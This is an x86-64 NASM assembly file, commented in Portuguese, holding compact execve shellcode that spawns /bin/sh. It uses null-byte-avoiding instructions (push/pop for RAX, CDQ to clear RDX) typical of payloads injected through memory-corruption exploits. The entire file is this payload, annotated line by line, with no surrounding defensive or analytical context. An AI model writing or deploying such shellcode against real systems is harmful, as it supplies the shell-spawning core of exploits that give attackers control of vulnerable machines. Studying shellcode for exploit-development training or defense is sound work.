[BITS 64]
global _start
section .text
_start:
    ; Limpeza e sincronizacao dos registradores
    push 59       ; Coloca o identificador __NR_execve (0x3b) na pilha
    pop rax       ; Descarrega em RAX. Bits superiores limpos nativamente.
    cdq           ; Estende o sinal de RAX para RDX (Zera RDX / envp = NULL)
    ; Configuracao de arg1 (pathname) = "//bin/sh"
    push rdx            ; Empilha o delimitador NULL estavel (8 bytes zero)
    mov rbx, '//bin/sh' ; Carrega a constante imediata de 8 bytes
    push rbx            ; Insere a string no topo da pilha
    mov rdi, rsp        ; RDI aponta para o endereco inicial da string
    ; Configuracao de arg2 (argv[]) = { "//bin/sh", NULL }
    push rdx            ; argv[1] = NULL
    push rdi            ; argv[0] = Ponteiro para o pathname
    mov rsi, rsp        ; RSI aponta para a matriz estruturada argv[]
    ; Invocacao controlada ao Kernel
    syscall             ; Transfere o fluxo para a rotina do SO
